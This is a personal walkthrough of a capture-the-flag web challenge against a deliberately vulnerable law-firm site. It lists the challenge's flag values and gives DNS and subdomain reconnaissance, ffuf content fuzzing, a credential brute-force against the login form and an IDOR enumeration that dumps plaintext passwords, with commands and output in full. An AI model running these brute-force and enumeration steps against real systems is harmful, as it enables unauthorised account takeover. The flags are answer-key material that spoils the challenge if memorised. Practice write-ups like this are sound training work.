---
ctf: cft_challenges
competition: false
categories: [web]
tools: [nslookup, dnsrecon, curl, fuff, seq, ZAP]
url: https://ctfchallenge.com/challenges/11
points: 600
captured: 2022-05-05
flag: [^FLAG^E78DEBBFDFBEAFF1336B599B0724A530^FLAG^, ^FLAG^FB52470E40F47559EBA87252B2D4CF67^FLAG^, ^FLAG^25032EB0D322F7330182507FBAA1A55F^FLAG^, ^FLAG^7F1ED1F306FC4E3399CEE15DF4B0AE3C^FLAG^, ^FLAG^938F5DC109A1E9B4FF3E3E92D29A56B3^FLAG^, ^FLAG^B38BAE0B8B804FCB85C730F10B3B5CB5^FLAG^]
summary: An introductory web challenge requiring bruteforcing and account takover.
---

```
## Subdomains
data.vulnlawyers.co.uk
www.vulnlawyers.co.uk

- www.vulnlawyers.co.uk/login 
	- -> 301 /denied 
		- -> 401 "Access is denied from your IP address"

- I accidentially brute forced `server.vulnlawyers.co.uk` instead...

## Flags
[^FLAG^E78DEBBFDFBEAFF1336B599B0724A530^FLAG^] - data.vulnlawyers.co.uk
[^FLAG^FB52470E40F47559EBA87252B2D4CF67^FLAG^] - www.vulnlawyers.co.uk/login
[^FLAG^25032EB0D322F7330182507FBAA1A55F^FLAG^] - http://data.vulnlawyers.co.uk/users
[^FLAG^7F1ED1F306FC4E3399CEE15DF4B0AE3C^FLAG^] - logging is as jaskaran.lowe@vulnlawyers.co.uk
[^FLAG^938F5DC109A1E9B4FF3E3E92D29A56B3^FLAG^] - http://vulnlawyers.co.uk/lawyers-only-profile-details/2
[^FLAG^B38BAE0B8B804FCB85C730F10B3B5CB5^FLAG^] - delete the case on http://vulnlawyers.co.uk/lawyers-only while signed in as Shayne
```

## DNS server records

```shell
nslookup -type=any vulnlawyers.co.uk 8.8.8.8

Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	vulnlawyers.co.uk
Address: 68.183.255.206
vulnlawyers.co.uk	nameserver = ns2.digitalocean.com.
vulnlawyers.co.uk	nameserver = ns3.digitalocean.com.
vulnlawyers.co.uk	nameserver = ns1.digitalocean.com.
vulnlawyers.co.uk
	origin = ns1.digitalocean.com
	mail addr = hostmaster.vulnlawyers.co.uk
	serial = 1626211986
	refresh = 10800
	retry = 3600
	expire = 604800
	minimum = 1800

Authoritative answers can be found from:
# Intentionally Left Blank
```

## Search SSL cert records

```shell
curl https://crt.sh/json?q=vulnlawyers.co.uk | python3 -m json.tool

[
    {
        "issuer_ca_id": 16418,
        "issuer_name": "C=US, O=Let's Encrypt, CN=Let's Encrypt Authority X3",
        "common_name": "vulnlawyers.co.uk",
        "name_value": "*.vulnlawyers.co.uk\nvulnlawyers.co.uk",
        "id": 2825708906,
        "entry_timestamp": "2020-05-04T15:22:47.45",
        "not_before": "2020-05-04T14:22:47",
        "not_after": "2020-08-02T14:22:47",
        "serial_number": "035bafc9a22abd25842546ca288dadda9da6"
    },
    {
        "issuer_ca_id": 16418,
        "issuer_name": "C=US, O=Let's Encrypt, CN=Let's Encrypt Authority X3",
        "common_name": "vulnlawyers.co.uk",
        "name_value": "*.vulnlawyers.co.uk\nvulnlawyers.co.uk",
        "id": 2765104534,
        "entry_timestamp": "2020-05-04T15:22:47.26",
        "not_before": "2020-05-04T14:22:47",
        "not_after": "2020-08-02T14:22:47",
        "serial_number": "035bafc9a22abd25842546ca288dadda9da6"
    }
]
```

## Subdomain brute force

```shell
dnsrecon -d vulnlawyers.co.uk -D ~/bounty/cftchallenge/wordlists/subdomains.txt -t brt

[*] Performing host and subdomain brute force against vulnlawyers.co.uk
[*] 	 A data.vulnlawyers.co.uk 68.183.255.206
[*] 	 A www.vulnlawyers.co.uk 68.183.255.206
[+] 2 Records Found
```

## Curl subdomain

```shell
curl -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" data.vulnlawyers.co.uk

{"name":"VulnLawyers Website API","version":"2.1.04","flag":"[^FLAG^E78DEBBFDFBEAFF1336B599B0724A530^FLAG^]"}
```

## Brute force directories/endpoints/pages content

```shell
ffuf -w ./wordlists/content.txt -t 1 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" -u http://www.vulnlawyers.co.uk/FUZZ -mc all -fc 404

________________________________________________

css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 24ms]
denied                  [Status: 401, Size: 1020, Words: 178, Lines: 30, Duration: 24ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 24ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 24ms]
login                   [Status: 302, Size: 1119, Words: 197, Lines: 31, Duration: 24ms]

ffuf -w ./wordlists/content.txt -t 1 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" -u server.vulnlawyers.co.uk/FUZZ -mc all -fc 404

NOTHING

ffuf -w ./wordlists/content.txt -t 1 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" -u data.vulnlawyers.co.uk/FUZZ -mc all -fc 404

NOTHING
```

## Brute forcing parameter 

```shell
ffuf -w ./wordlists/parameters.txt -t 1 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" -u data.vulnlawyers.co.uk?FUZZ=test_value -mc all -fs 109 -fc 404

NOTHING
```

## ZAP Proxy
When visiting `/login`, there's a `301 Found` and a redirect to `/denied`. However, with the `301` response `www.vulnlawyers.co.uk` also sends an HTTP body:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>VulnLawyers - Old Login</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet">
    <link href="/template-manager/style.css" rel="stylesheet">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <h1 style="padding-top:100px;text-align: center;color: #060505;letter-spacing: -1px;font-weight: bold">VulnLawyers</h1>
            <h3 class="text-center">We'll win that case!</h3>
        </div>
    </div>
    <div class="row">
        <div class="col-md-6 col-md-offset-3">
            <div class="alert alert-info">
                <p>Access to this portal can now be found here <a href=/lawyers-only">/lawyers-only</a></p>
                <p>[^FLAG^FB52470E40F47559EBA87252B2D4CF67^FLAG^]</p>
            </div>
        </div>
    </div>
</div>
<script src="/js/jquery.min.js"></script>
<script src="/js/bootstrap.min.js"></script>
</body>
</html>
```

This reveals a flag and an endpoint to visit. 

It's notable that the HTML is broken

Now to visit `/lawyers-only`. There's a `302` to `/lawyers-only-login` and then an email/password form.

I would try to brute force the email, but I saw others mention that there are emails somewhere. I saw that there's a `hostmaster.vulnlawyers.co.uk` in the DNS record...

Anyway, first, let's try `'` SQL injection.

It looks properly encoded:

```
email=%27&password=%27
```

Let's try bypassing with the proxy.

Same "Invalid Email/Password combination."

Let's look for emails.

Maybe a WHOIS lookup!

```
whois vulnlawyers.co.uk

    Domain name:
        vulnlawyers.co.uk

    Data validation:
        Nominet was able to match the registrant's name and address against a 3rd party data source on 28-Feb-2020

    Registrar:
        Ionos SE [Tag = 1AND1]
        URL: https://ionos.com

    Relevant dates:
        Registered on: 04-May-2020
        Expiry date:  04-May-2023
        Last updated:  03-May-2022

    Registration status:
        Registered until expiry date.

    Name servers:
        ns1.digitalocean.com
        ns2.digitalocean.com
        ns3.digitalocean.com

    WHOIS lookup made at 20:07:31 05-May-2022

--
This WHOIS information is provided for free by Nominet UK the central registry
for .uk domain names. This information and the .uk WHOIS are:

    Copyright Nominet UK 1996 - 2022.

You may not access the .uk WHOIS or use any data from it except as permitted
by the terms of use available in full at https://www.nominet.uk/whoisterms,
which includes restrictions on: (A) use of the data for advertising, or its
repackaging, recompilation, redistribution or reuse (B) obscuring, removing
or hiding any or all of this notice and (C) exceeding query rate or volume
limits. The data is provided on an 'as-is' basis and may lag behind the
register. Access may be withdrawn or restricted at any time.
```

I was trying to be cool using the `json` endpoint, but you get so much more information by visiting https://crt.sh/?q=vulnlawyers.co.uk... okay... not that much more.

Maybe I was fuzzing wrong, there were a ton of errors being counted... I think I need the `http://` in the url

```shell
ffuf -w ./wordlists/content.txt -t 1 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" -u http://data.vulnlawyers.co.uk/FUZZ -mc all -fc 404
________________________________________________
users                   [Status: 200, Size: 406, Words: 6, Lines: 1, Duration: 24ms]
```

AHA!!

The `/users` endpoint on the `data` subdomain returns a payload of emails and a flag!

```json
{
  "users": [
    {
      "name": "Yusef Mcclain",
      "email": "yusef.mcclain@vulnlawyers.co.uk"
    },
    {
      "name": "Shayne Cairns",
      "email": "shayne.cairns@vulnlawyers.co.uk"
    },
    {
      "name": "Eisa Evans",
      "email": "eisa.evans@vulnlawyers.co.uk"
    },
    {
      "name": "Jaskaran Lowe",
      "email": "jaskaran.lowe@vulnlawyers.co.uk"
    },
    {
      "name": "Marsha Blankenship",
      "email": "marsha.blankenship@vulnlawyers.co.uk"
    }
  ],
  "flag": "[^FLAG^25032EB0D322F7330182507FBAA1A55F^FLAG^]"
}
```

I'm going to try to fuzz both the email and the passwords, but first, I have to try to login and see what the request looks like in ZAP... or in dev tools?

```
email=foo&password=bar
```

and create the email wordlist

```
yusef.mcclain@vulnlawyers.co.uk
shayne.cairns@vulnlawyers.co.uk
eisa.evans@vulnlawyers.co.uk
jaskaran.lowe@vulnlawyers.co.uk
marsha.blankenship@vulnlawyers.co.uk
```

Then the command

```shell
ffuf -w ./vulnlawyer_emails.txt:EMAIL -w ./wordlists/passwords.txt:PASS -X POST -d "email=EMAIL&password=PASS" -t 1 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" -H "Content-Type: application/x-www-form-urlencoded" -u http://vulnlawyers.co.uk/lawyers-only-login -fr 'Invalid Email/Password combination'
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
    * EMAIL: jaskaran.lowe@vulnlawyers.co.uk
    * PASS: summer
```

This is becoming fun!

Logging in gives us a new token cookie:

```
set-cookie: token=7BCC07AAE3CCD9CD66223DF6D6932582;
```

On the profile page, trying to edit the name or email gives a "Updates are currently disabled" and the params seem to be sanitized.

On the main Portal page there's a message that says "Changes can only by performed by case manager," and that the case is "Managed by" Shayne Cairns. I this we should use the large password list to try to brute force their password.

```shell
ffuf -w ./wordlists/passwords-large.txt -X POST -d "email=shayne.cairns@vulnlawyers.co.uk&password=FUZZ" -t 1 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" -H "Content-Type: application/x-www-form-urlencoded" -u http://vulnlawyers.co.uk/lawyers-only-login -fr 'Invalid Email/Password combination'
```

As I'm brute forcing, I just realized the the profile page url is:

```
http://vulnlawyers.co.uk/lawyers-only-profile-details/4
```

...even though it shows up in the URL bar as:

```
http://vulnlawyers.co.uk/lawyers-only-profile-details
```

I'm wondering if that `:id` param can be spoofed/lacks authorization controls, or maybe contains a SQL  injection.

Also, this jQuery script in the page seems sus:

```html
<script>
    $.getJSON('/lawyers-only-profile-details/4',function(resp){
        $('input[name="email"]').val( resp.email );
        $('input[name="name"]').val( resp.name );
    });
</script>
```

OH! 

That's the thing making the GET request to `http://vulnlawyers.co.uk/lawyers-only-profile-details/4`, not the browser. But I can definitely call that endpoint myself. Looking in ZAP, it also returns the password in plain text!! 

```json
{"id":4,"name":"Jaskaran Lowe","email":"jaskaran.lowe@vulnlawyers.co.uk","password":"summer"}
```

Let's use `seq` to grab them al!! (I quite the brute forcing job).

We definitely need the token to make the request. Lucky that we have it.

```shell
seq 1 100 | ffuf -w - -t 1 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9; token=7BCC07AAE3CCD9CD66223DF6D6932582" -u http://vulnlawyers.co.uk/lawyers-only-profile-details/FUZZ -mc all -fc 404
________________________________________________
1                       [Status: 200, Size: 101, Words: 2, Lines: 1, Duration: 23ms]
2                       [Status: 200, Size: 157, Words: 2, Lines: 1, Duration: 25ms]
3                       [Status: 200, Size: 95, Words: 2, Lines: 1, Duration: 24ms]
4                       [Status: 200, Size: 93, Words: 2, Lines: 1, Duration: 22ms]
5                       [Status: 200, Size: 111, Words: 2, Lines: 1, Duration: 23ms]
```

That was simpler than I thought.

```shell
seq 1 5 | xargs -I FUZZ curl -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9; token=7BCC07AAE3CCD9CD66223DF6D6932582" http://vulnlawyers.co.uk/lawyers-only-profile-details/FUZZ;

{"id":1,"name":"Yusef Mcclain","email":"yusef.mcclain@vulnlawyers.co.uk","password":"Rk@c7#U3@2r%0f"}
{"id":2,"name":"Shayne Cairns","email":"shayne.cairns@vulnlawyers.co.uk","password":"q2V944&#2a1^3p","flag":"[^FLAG^938F5DC109A1E9B4FF3E3E92D29A56B3^FLAG^]"}
{"id":3,"name":"Eisa Evans","email":"eisa.evans@vulnlawyers.co.uk","password":"Sn06#ibx@lGPG7"}
{"id":4,"name":"Jaskaran Lowe","email":"jaskaran.lowe@vulnlawyers.co.uk","password":"summer"}
{"id":5,"name":"Marsha Blankenship","email":"marsha.blankenship@vulnlawyers.co.uk","password":"A^66vqhOU!e2ZV"}
```

Logins are still disabled on the profile page. No SQL injection.

There's now a delete button on the Portal page!

